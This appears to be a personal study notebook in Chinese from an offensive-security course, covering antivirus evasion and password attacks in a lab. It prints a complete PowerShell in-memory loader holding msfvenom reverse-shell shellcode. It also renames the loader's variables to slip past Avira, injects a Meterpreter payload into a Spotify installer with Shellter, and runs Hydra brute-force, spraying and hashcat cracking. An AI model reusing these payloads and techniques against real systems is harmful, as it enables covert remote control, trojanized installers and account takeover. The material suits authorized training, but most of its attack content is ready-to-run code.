從 kernel32.dll 匯入 [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) 和 [CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread) ，以及從 msvcrt.dll匯入memset。這些函數將允許分別分配記憶體、建立執行緒以及將任意資料寫入分配的記憶體。\
首先使用 VirtualAlloc 分配一個記憶體區塊，該記憶體區塊取得儲存在 `$sc` 位元組數組中的有效負載的每個位元組，並使用 memset 寫入新分配的記憶體區塊。最後使用 CreateThread API 在記憶體中寫入的有效負載。
5. msfvenom 產生有效附載
```
┌──(chw㉿CHW-kali)-[~]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
...
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 699 bytes
Final size of powershell file: 3454 bytes
[Byte[]] $sc =  0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28
...
```
完整腳本:
```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]] $sc = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x0,0x0,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0xb8,0x90,0x1,0x0,0x0,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x0,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x5,0x68,0xc0,0xa8,0x32,0x1,0x68,0x2,0x0,0x1,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xc,0xff,0x4e,0x8,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x68,0x63,0x6d,0x64,0x0,0x89,0xe3,0x57,0x57,0x57,0x31,0xf6,0x6a,0x12,0x59,0x56,0xe2,0xfd,0x66,0xc7,0x44,0x24,0x3c,0x1,0x1,0x8d,0x44,0x24,0x10,0xc6,0x0,0x44,0x54,0x50,0x56,0x56,0x56,0x46,0x56,0x4e,0x56,0x56,0x53,0x56,0x68,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x89,0xe0,0x4e,0x56,0x46,0xff,0x30,0x68,0x8,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```
Antiscan.Me不支援ps1格式。根據 VirusTotal 掃描的結果，59 個 AV 產品中有 28 個將我們的腳本標記為惡意，其中包括 Avira。
![image](https://hackmd.io/_uploads/HyOxqAwwyg.png)

防毒通常根據 variables 或 function names 判斷，所以嘗試更改 variables

6. 更改變數名稱
```powershell
$var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;

[Byte[]];   
[Byte[]] $var1 = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28
...

$size = 0x1000;

if ($var1.Length -gt 0x1000) {$size = $var1.Length};

$x = $var2::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i), $var1[$i], 1)};

$var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```
> Add-Type cmdlet 的 Win32 硬編碼類別名稱更改: `iWin32`\
> sc 和 winFunc 分別重新命名為 `var1`和 `var2`

 Avira 掃瞄通過，由於 msfvenom 有效負載適用於 x86，因此我們將啟動 x86 版本的 PowerShell
 
7. 執行 x86 腳本
```
PS C:\Users\CHW\Desktop> .\bypass.ps1
.\bypass.ps1 : File C:\Users\offsec\Desktop\bypass.ps1 cannot be loaded because running scripts is disabled on this
system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:1
+ .\bypass.ps1
+ ~~~~~~~~~~~~
    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess
```
> error that references the Execution Policies of our system
 
>[!caution]
> much like anything in Windows, the PowerShell Execution Policy settings can be dictated by one or more `Active Directory GPOs`. In those cases, it may be necessary to search for additional bypass vectors.

透過 Get-ExecutionPolicy -Scope CurrentUser指令檢索目前執行策略，然後透過Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser指令將其設為Unrestricted。
```
PS C:\Users\CHW\Desktop> Get-ExecutionPolicy -Scope CurrentUser
Undefined

PS C:\Users\CHW\Desktop> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help Module at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A

PS C:\Users\CHW\Desktop> Get-ExecutionPolicy -Scope CurrentUser
Unrestricted
```
(On powershell x86)
```
PS C:\Users\CHW\Desktop> .\bypass.ps1

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     Byte[]                                   System.Array
124059648
124059649
...
```
(On kali)
```
┌──(chw㉿CHW-kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.50.1] from (UNKNOWN) [192.168.50.62] 64613
Microsoft Windows [Version 10.0.22000.675]
(c) Microsoft Corporation. All rights reserved.

C:\Users\offsec>whoami
whoami
client01\offsec

C:\Users\offsec>hostname
hostname
client01

```
避開了 Avira 偵測，但也可能被 EDR systems 偵測並通報 SOC team 

### Automating the Process

[Shellter](https://www.shellterproject.com/homepage/) 用於在 Windows 平台上進行可執行檔案的 Dynamic Shellcode Injection。主要用於將惡意 shellcode 注入合法的可執行檔案中，使得該檔案在外觀和行為上仍看似正常，但內部執行時會執行 shellcode。\
Shellter attempts to use the existing PE Import Address Table (IAT) entries to locate functions that will be used for the memory allocation, transfer, and execution of our payload.\
(Kali)
```
┌──(chw㉿CHW-kali)-[~]
└─$ apt-cache search shellter
shellter - Dynamic shellcode injection tool and dynamic PE infector

┌──(chw㉿CHW-kali)-[~]
└─$ sudo apt install shellter
...
┌──(chw㉿CHW-kali)-[~]
└─$ sudo apt install wine
...
root@kali:~# dpkg --add-architecture i386 && apt-get update &&
apt-get install wine32
```
> 由於 Shellter 是基於 Windows 的工具，需使用 Wine 來讓 Shellter 能夠在 POSIX 系統（如 Kali Linux 或 macOS）上運行

(Mac)
```
CWei@CHW-MacBook-Pro % brew install --cask wine-stable
...
CWei@CHW-MacBook-Pro % cd shellter/
CWei@CHW-MacBook-Pro shellter % ls
Executable_SHA-256.txt	docs			licenses		shellcode_samples	shellter.exe
CWei@CHW-MacBook-Pro shellter % wine shellter.exe
zsh: killed     wine shellter.exe
```

![image](https://hackmd.io/_uploads/Byi8oe_vyx.png)
1. Shellter 提供兩種模式：\
Auto 模式（自動模式）：適合快速注入，對於大多數情境足夠。
Manual 模式（手動模式）：用於細化操作，如自訂注入參數。

準備目標 PE file，範例使用合法的 Windows 可執行文件（Spotify 安裝程式 spotifysetup.exe)
![image](https://hackmd.io/_uploads/r18E0H5Pkg.png)
> PE target: 目標文件路徑\
> Backup: 建立備份

2. 是否要啟用Stealth Mode
此模式可在 payload 執行後恢復 PE 的執行流程
![image](https://hackmd.io/_uploads/ryk6RS5wJe.png)

3. 使用有效 payload
為了測試 Shellter 的繞過功能，我們將使用 Avira 在本模組開頭偵測到的反向 shell 負載的 Meterpreter 版本\

>[!Note]
> Meterpreter 是一種由 Metasploit 框架提供的 backdoor 工具。它是一個強大的 payload，能夠在目標系統上執行各種命令，並且提供豐富的功能來控制目標機器。\
> ([Offsec](https://www.offsec.com/metasploit-unleashed/about-meterpreter/)) Meterpreter is an advanced, dynamically extensible payload that uses in-memory DLL injection stagers and is extended over the network at runtime.

![image](https://hackmd.io/_uploads/rkDrh8qP1x.png)
> 輸入 L 列出 payload，然後選擇合適的選項\
> 輸入 reverse shell host (LHOST) and port (LPORT)
>> Injection: Verified!

4. 在 Kali 設置 Meterpreter 監聽
啟動 msfconsole，設置 Meterpreter 監聽

```
┌──(chw㉿CHW-kali)-[~]
└─$ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
...
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
LHOST => 192.168.50.1
LPORT => 443
[*] Started reverse TCP handler on 192.168.50.1:443
```

5. Windows 測試 PE file
![image](https://hackmd.io/_uploads/B1EXgPcwJg.png)\
因為 Shellter 在 injection PE 之前已經進行混淆，因此 Avira 基於簽章的掃描可以乾淨地運行。它不認為二進位檔案是惡意的。

6. 啟動 PE file (Spotify installer)
成功收到 Meterpreter shell
```
...
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_tcp
LHOST => 192.168.50.1
LPORT => 443
[*] Started reverse TCP handler on 192.168.50.1:443
[*] Sending stage (175174 bytes) to 192.168.50.62
[*] Meterpreter session 1 opened (192.168.50.1:443 -> 192.168.50.62:52273)...

meterpreter > shell
Process 6832 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22000.739]
(c) Microsoft Corporation. All rights reserved.

C:\Users\CHW\Desktop>whoami
whoami
client01\CHW
```

# Password Attacks
## Attacking Network Services Logins
### 1. SSH and RDP logins (hydra)
[Hydra（THC-Hydra）](https://github.com/vanhauser-thc/thc-hydra)是一款網路密碼破解工具，支援多的協議，例如：HTTP/HTTPS, FTP, SSH, RDP, Telnet, MySQL, PostgreSQL, MSSQL, SMTP, POP3, IMAP ..etc\
![image](https://hackmd.io/_uploads/ByKbqwcDJl.png)

```
┌──(chw㉿CHW)-[~]
└─$ sudo nmap -sV -p 2222 192.168.50.201
...
PORT   STATE SERVICE
2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
...
┌──(chw㉿CHW)-[~]
└─$ hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
...
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.50.201:22/
[2222][ssh] host: 192.168.50.201   login: george   password: chocolate
1 of 1 target successfully completed, 1 valid password found
...
```
- password spraying
Password spraying 是一種暴破手法，攻擊者會對目標系統進行大範圍的嘗試，使用常見的密碼嘗試對多個帳號進行登入，而不是針對單一帳號進行大量嘗試

```
┌──(chw㉿CHW)-[~]
└─$ hydra -L /Users/CWei/Tool/dirb/wordlists/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
...
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:14344399/p:1), ~3586100 tries per task
[DATA] attacking rdp://192.168.50.202:3389/
...
[3389][rdp] host: 192.168.50.202   login: daniel   password: SuperS3cure1337#
[ERROR] freerdp: The connection failed to establish.
[3389][rdp] host: 192.168.50.202   login: justin   password: SuperS3cure1337#
[ERROR] freerdp: The connection failed to establish.
...
```
> 用有效的使用者密碼 `SuperS3cure1337#`，爆破 RDP 使用者帳戶

### 2. HTTP POST login forms
#### 2.1 Login page
以 [TinyFileManager](https://github.com/prasathmani/tinyfilemanager) 為例，透過 Open source 可以得知有兩組預設帳號密碼： `amdin` & `user`
![image](https://hackmd.io/_uploads/ByB0kNvF1l.png)\

request:
```
POST / HTTP/1.1
Host: 192.168.230.201
Content-Length: 25
Cache-Control: max-age=0
Accept-Language: zh-TW
Upgrade-Insecure-Requests: 1
Origin: http://192.168.230.201
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.89 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.230.201/
Accept-Encoding: gzip, deflate, br
Cookie: filemanager=831mv2t09ma1h2ef3urp9oe13r
Connection: keep-alive

fm_usr=user&fm_pwd=user
```
![image](https://hackmd.io/_uploads/HJNKgNDtJl.png)\
透過 Error message 讓 hydra 判斷是否成功，並帶上 http-post-form argument:\
`Login failed. Invalid username or password`

```
CWei@CHW-MacBook-Pro wordlist % hydra -l user -P rockyou.txt 192.168.230.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login
 failed. Invalid"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-10 16:03:21
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://192.168.230.201:80/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid
[STATUS] 32.00 tries/min, 32 tries in 00:01h, 14344366 to do in 7471:02h, 16 active
[STATUS] 32.00 tries/min, 96 tries in 00:03h, 14344302 to do in 7470:60h, 16 active
[80][http-post-form] host: 192.168.230.201   login: user   password: 121212
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-10 16:08:23
```
> 1. `fm_usr=admin&fm_pwd=^PASS^`:
fm_usr=admin：帳號固定為 admin\
fm_pwd=^PASS ^：密碼部分, Hydra 會依照 rockyou.txt 內容替換。
> 2. `Login failed. Invalid`: 將 error message 作為判斷基準
>> **[80][http-post-form] host: 192.168.230.201   login: user   password: 121212**

>[!note]
> 若 Server 環境有 WAF 或 [fail2ban](https://github.com/fail2ban/fail2ban)，無法用暴力破解

#### 2.2 web page is password protected
![image](https://hackmd.io/_uploads/Hk_6PEDYJe.png)

request 使用了 Basic Authentication，
```
GET / HTTP/1.1
Host: 192.168.230.201
Cache-Control: max-age=0
Authorization: Basic YWRtaW46YWRtaW4=
Accept-Language: zh-TW
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.89 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: filemanager=2k1ko9c196gp71td42h734d31e
Connection: keep-alive
```
> `Authorization: Basic YWRtaW46YWRtaW4=` 是 Base64 編碼後的 admin:admin

因為 Basic Authentication 會影響整個網頁路徑，所以直接瀏覽根目錄就可
```
CWei@CHW-MacBook-Pro wordlist % hydra -l admin -P rockyou.txt 192.168.230.201 http-get "/"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-10 16:21:02
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-get://192.168.230.201:80/
[80][http-get] host: 192.168.230.201   login: admin   password: 789456
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-10 16:21:17
```
> **[80][http-get] host: 192.168.230.201   login: admin   password: 789456**

## Password Cracking Fundamentals
### Encryption, Hashes and Cracking
1. Differences between encryption and hash algorithms
    (1) Encryption is a two-way function: `scrambled (encrypted)` or `unscrambled (decrypted)`
    - Symmetric encryption: 使用相同的金鑰，雙方都需要知道密鑰
        - Attacker: Man-in-the-middle attack
        - [Advanced Encryption Standard](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) (AES)
    - Asymmetric encryption: 包含私鑰和公鑰，每個 user 都有自己的密鑰，當 user 要接收加密訊息，需要將其公鑰提供給 communication partner
        - [Rivest–Shamir–Adleman](https://en.wikipedia.org/wiki/RSA_(cryptosystem)) (RSA)
    
    (2) Hash (or digest) is the result of running variable-sized input data through a hash algorithm (such as [SHA1](https://en.wikipedia.org/wiki/SHA-1) or [MD5](https://en.wikipedia.org/wiki/MD5)), The password is often hashed and stored in a database
    - Result: 唯一的固定長度的十六進制
    - extremely rare [hash collision (哈希衝突)](https://en.wikipedia.org/wiki/Hash_collision)
    - one-way functions:MD5 and SHA1
    - keyspace: 
        - 假設 大小寫英文字母 (52 characters) & 數字 (10 characters)，每個字元就有 62 種可能的變體
            - 若一個 五個字元的密碼: `python3 -c "print(62**5)": 916132832` (916132832 種可能)

2. password cracking
Take a considerable amount of time\
```
┌──(chw㉿CHW)-[~]
└─$ echo -n "secret" | sha256sum
2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b  -

┌──(chw㉿CHW)-[~]
└─$ echo -n "secret" | sha256sum
2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b  -

┌──(chw㉿CHW)-[~]
└─$ echo -n "secret1" | sha256sum
5b11618c2e44027877d0cd0921ed166b9f176f50587fc91e7534dd2946db77d6  -
```
> 可以看出一樣的字串經過 hash 結果會一樣。相近的字串經過 hash 後會完全不同

- [Hashcat](https://hashcat.net/hashcat/)
    - 基於CPU的破解工具，同時也支援GPU
    - 不需要附加驅動
- [John the Ripper (JtR)](https://www.openwall.com/john/)
    - 基於GPU的破解工具，同時也支援CPU
    - 需要 [OpenCL](https://en.wikipedia.org/wiki/OpenCL) 或 [CUDA](https://developer.nvidia.com/cuda-toolkit)

```
CWei@CHW-MacBook-Pro ~ % hashcat -b
hashcat (v6.2.6) starting in benchmark mode

Benchmarking uses hand-optimized kernel code by default.
You can use it in your cracking session by setting the -O option.
Note: Using optimized kernel code limits the maximum supported password length.
To disable the optimized kernel code in benchmark mode, use the -w option.

* Device #2: Apple's OpenCL drivers (GPU) are known to be unreliable.
             You have been warned.

METAL API (Metal 367.6)
=======================
* Device #1: Apple M3, 8160/16384 MB, 10MCU

OpenCL API (OpenCL 1.2 (Dec 13 2024 23:09:21)) - Platform #1 [Apple]
====================================================================
* Device #2: Apple M3, skipped

Benchmark relevant options:
===========================
* --optimized-kernel-enable

-------------------
* Hash-Mode 0 (MD5)
-------------------

Speed.#1.........:  3268.4 MH/s (101.74ms) @ Accel:1024 Loops:256 Thr:128 Vec:1

----------------------
* Hash-Mode 100 (SHA1)
----------------------

Speed.#1.........:   911.7 MH/s (90.38ms) @ Accel:256 Loops:1024 Thr:32 Vec:1

---------------------------
* Hash-Mode 1400 (SHA2-256)
---------------------------

Speed.#1.........:   536.3 MH/s (77.45ms) @ Accel:32 Loops:1024 Thr:128 Vec:1
```
![image](https://hackmd.io/_uploads/SJAvUSPKkl.png)

根據 offsec 實驗， GPU 需要大約 6.5 小時來嘗試八個字元密碼的所有可能組合，GPU 需要大約 2.8年來嘗試十個字元密碼的所有可能組合。

### Mutating Wordlists
密碼通常有最小長度以及大寫和小寫字母、特殊字元和數字的組合\
👉🏻 [rule-based attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack)

以下建立 rule function，透過 function 自動更改(or mutating)，讓 wordlist 符合密碼規則:
1. 將 rockyou.txt 前 10 個 密碼，複製到 passwordattacks/demo.txt 當作範例
```
┌──(root㉿CHW)-[/usr/share/wordlists]
└─# head rockyou.txt      
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123

┌──(root㉿CHW)-[/usr/share/wordlists]
└─# mkdir passwordattacks && head rockyou.txt > passwordattacks/demo.txt
```
2. 刪除 demo.txt 中以數字 1 開頭的行
```
┌──(root㉿CHW)-[/usr/share/wordlists/passwordattacks]
└─# sed -i '/^1/d' demo.txt

┌──(root㉿CHW)-[/usr/share/wordlists/passwordattacks]
└─# cat demo.txt      
password
iloveyou
princess
rockyou
abc123
```
> 使用 `-i` 進行編輯，`d`刪除\
> `/^1/`：正則表達式，匹配以 1 開頭的

假設 password policy 要求 必須包含一個數值、一個特殊字元和一個大寫字母\
[Hashcat Wiki](https://hashcat.net/wiki/doku.php?id=rule_based_attack) 提供 rule functions 可以使用

3. 建立 rule functions
假設需要以數字1開頭，並且有大寫字母
>[!note]
> rule 會識別單獨的行\
> ex.1 透過空白間隔指的是 **將第一個字母轉換成大寫**
> ```
>┌──(root㉿CHW)-[/usr/share/wordlists/passwordattacks]
>└─# cat demo1.rule     
>$1 c      
>┌──(root㉿CHW)-[/usr/share/wordlists/passwordattacks]
>└─# hashcat -r demo1.rule --stdout demo.txt
>Password1
>Iloveyou1
>Princess1
>Rockyou1
>Abc1231
> ```
> ex.2 透過換行指的是兩個規則 **字元後面＋1與將第一個字母轉換成大寫**
> ```
>┌──(root㉿CHW)-[/usr/share/wordlists/passwordattacks]
>└─#cat demo2.rule   
>$1
>c
>┌──(root㉿CHW)-[/usr/share/wordlists/passwordattacks]
>└─# hashcat -r demo2.rule --stdout demo.txt
>password1
>Password
>iloveyou1
>Iloveyou
>princess1
>Princess
>...
> ```

4. Hashcat 爆破
範例要求 加入最常見 (ever-popular) "1", "2", and "123" 和特殊字元！\
使用 Hash (crackme.tx) 作為爆破目標
```
┌──(root㉿CHW)-[/usr/share/wordlists]
└─# cat demo.rule                                            
$1 c $!
$2 c $!
$1 $2 $3 c $!                                                                       
┌──(root㉿CHW)-[/usr/share/wordlists]
└─# cat crackme.txt                                          
f621b6c9eab51a3e2f4e167fee4c6860

┌──(root㉿CHW)-[/usr/share/wordlists]
└─# hashcat -m 0 crackme.txt rockyou.txt -r demo.rule --show 
f621b6c9eab51a3e2f4e167fee4c6860:Computer123!

```

> 1. $1 c $!
>`$1`：取密碼的 第一個字母\
>`c`：將該字母轉為 大寫\
>`$!``：在密碼後面加上 !
> 2. $2 c $!
>`$2`：取密碼的 第二個字母\
>`c`：將該字母轉為 大寫\
>`$!`：在密碼後面加上 !
>3. $1 $2 $3 c $!
>`$1 $2 $3`：取密碼的 前三個字母
>`c`：將這三個字母轉為 大寫
>`$!`：在密碼後面加上 !

>[!Important]
> Hashcat 有官方 rule files：
> ```
>┌──(root㉿CHW)-[/usr/share/wordlists]
>└─# ls -al ../hashcat/rules 
>total 2860
>drwxr-xr-x 3 root root   4096 Feb  3 04:16 .
>drwxr-xr-x 9 root root   4096 Feb  3 04:16 ..
>-rw-r--r-- 1 root root 309439 Apr 24  2024 Incisive-leetspeak.rule
>-rw-r--r-- 1 root root  35802 Apr 24  2024 InsidePro-HashManager.rule
>-rw-r--r-- 1 root root  20580 Apr 24  2024 InsidePro-PasswordsPro.rule
>-rw-r--r-- 1 root root  64068 Apr 24  2024 T0XlC-insert_00-99_1950->2050_toprules_0_F.rule
>-rw-r--r-- 1 root root   2027 Apr 24  2024 T0XlC->insert_space_and_special_0_F.rule
>-rw-r--r-- 1 root root  34437 Apr 24  2024 T0XlC->insert_top_100_passwords_1_G.rule
>-rw-r--r-- 1 root root  34813 Apr 24  2024 T0XlC.rule
>-rw-r--r-- 1 root root   1289 Apr 24  2024 T0XlC_3_rule.rule
>-rw-r--r-- 1 root root 168700 Apr 24  2024 >T0XlC_insert_HTML_entities_0_Z.rule
>-rw-r--r-- 1 root root 197418 Apr 24  2024 T0XlCv2.rule
>-rw-r--r-- 1 root root    933 Apr 24  2024 best64.rule
>-rw-r--r-- 1 root root    754 Apr 24  2024 combinator.rule
>-rw-r--r-- 1 root root 200739 Apr 24  2024 d3ad0ne.rule
>-rw-r--r-- 1 root root 788063 Apr 24  2024 dive.rule
>-rw-r--r-- 1 root root  78068 Apr 24  2024 generated.rule
>-rw-r--r-- 1 root root 483425 Apr 24  2024 generated2.rule
>drwxr-xr-x 2 root root   4096 Feb  3 04:16 hybrid
> ```

Example: You extracted the MD5 hash "19adc0e8921336d08502c039dc297ff8" from a target system. Create a rule which makes all letters upper case and duplicates the passwords contained in rockyou.txt and crack the hash.

Ans: 
```
┌──(root㉿CHW)-[/usr/share/wordlists]
└─# cat demo.rule
u d
                                                                             
┌──(root㉿CHW)-[/usr/share/wordlists]
└─# hashcat -m 0 19adc0e8921336d08502c039dc297ff8 rockyou.txt -r demo.rule --force
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
* Device #1: cpu--0x000, 1437/2939 MB (512 MB allocatable), 3MCU
...

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

19adc0e8921336d08502c039dc297ff8:BUTTERFLY5BUTTERFLY5     
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 19adc0e8921336d08502c039dc297ff8
...
Hardware.Mon.#1..: Util: 35%

Started: Tue Feb 11 02:11:23 2025
Stopped: Tue Feb 11 02:11:25 2025

```
> BUTTERFLY5BUTTERFLY5

### Cracking Methodology
identify the hash type with:
- [hash-identifier](https://www.kali.org/tools/hash-identifier/)
```
┌──(root㉿CHW)-[/usr/share/wordlists]
└─# hash-identifier 19adc0e8921336d08502c039dc297ff8                              
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

Least Possible Hashs:
...
```
- [hashid](https://www.kali.org/tools/hashid/)
```
┌──(root㉿CHW)-[/usr/share/wordlists]
└─# hashid 19adc0e8921336d08502c039dc297ff8  
Analyzing '19adc0e8921336d08502c039dc297ff8'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
...
```

### Password Manager
Popular password managers include [1Password](https://1password.com/) and [KeePass](https://keepass.info/).

